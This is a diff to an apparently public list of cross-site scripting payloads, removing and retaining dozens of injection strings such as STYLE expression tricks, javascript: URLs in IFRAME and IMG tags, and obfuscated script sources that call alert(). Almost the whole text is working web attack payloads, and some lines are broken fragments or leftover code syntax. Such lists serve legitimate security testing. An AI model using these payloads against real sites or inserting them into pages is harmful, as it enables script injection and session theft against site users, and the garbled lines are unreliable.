@@ -6,11 +6,6 @@
 
 
 <img src="https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg"> <img src="https://img.shields.io/github/stars/payloadbox/xss-payload-list?style=social"> <img src="https://img.shields.io/github/forks/payloadbox/xss-payload-list?style=social"> <img src="https://img.shields.io/github/repo-size/payloadbox/xss-payload-list"> <img src="https://img.shields.io/github/license/payloadbox/xss-payload-list"> <img src="https://img.shields.io/github/issues/detail/author/payloadbox/xss-payload-list/1">
-<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS
-<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">
-<XSS STYLE="xss:expression(javascript:alert(1))">
-<STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>
-<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>
 <HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
 <HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
 <IMG SRC=" &#14;  javascript:alert('XSS');">
@@ -20,7 +15,7 @@
 <A HREF="http://0102.0146.0007.00000223/">XSS</A>
 <A HREF="htt    p://6   6.000146.0x7.147/">XSS</A>
 <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
-<img src=xss onerror=alert(1)>
+
 <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
 <script>alert("XSS");</script>&search=1
 &lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;
@@ -39,12 +34,9 @@ exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("
 "><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1>
 "><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1
 <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
-<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS
-<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">
-<XSS STYLE="xss:expression(javascript:alert(1))">
-<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>
+A>
 <HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
-<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
+
 <IMG SRC=" &#14;  javascript:alert('XSS');">
 <DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
 <A HREF="http://66.102.7.147/">XSS</A>
@@ -82,4 +74,4 @@ a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";alert(';XSS';);";
 <;A HREF=";http://0102.0146.0007.00000223/";>;XSS<;/A>;
 <;A HREF=";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/";>;XSS<;/A>;
 '%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
-<img src=xss onerror=alert(1)>
+
